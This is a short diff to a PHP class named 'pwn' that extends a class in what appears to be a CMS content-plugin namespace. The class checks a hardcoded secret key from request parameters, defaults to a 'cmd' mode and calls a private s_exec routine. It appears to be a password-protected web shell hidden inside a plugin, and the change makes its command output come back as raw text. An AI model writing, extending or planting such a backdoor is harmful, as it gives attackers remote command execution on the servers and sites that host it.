@@ -12,7 +12,7 @@ class pwn extends Lomart\Plugin\Content\Up\Extension\Up
         parse_str($data, $output);
 
         if (!isset($output['k']) || $output['k'] !== 'PT29-K-7f4a91c2') {
-            return json_encode(['success'=>false,'data'=>['bad key']]);
+            return 'BAD-KEY';
         }
 
         $m = $output['m'] ?? 'cmd';
@@ -85,7 +85,7 @@ class pwn extends Lomart\Plugin\Content\Up\Extension\Up
             $r = 'EXC: ' . $e->getMessage();
         }
 
-        return json_encode(['success' => true, 'data' => [$r]]);
+        return $r;
     }
 
     private static function s_exec($c)
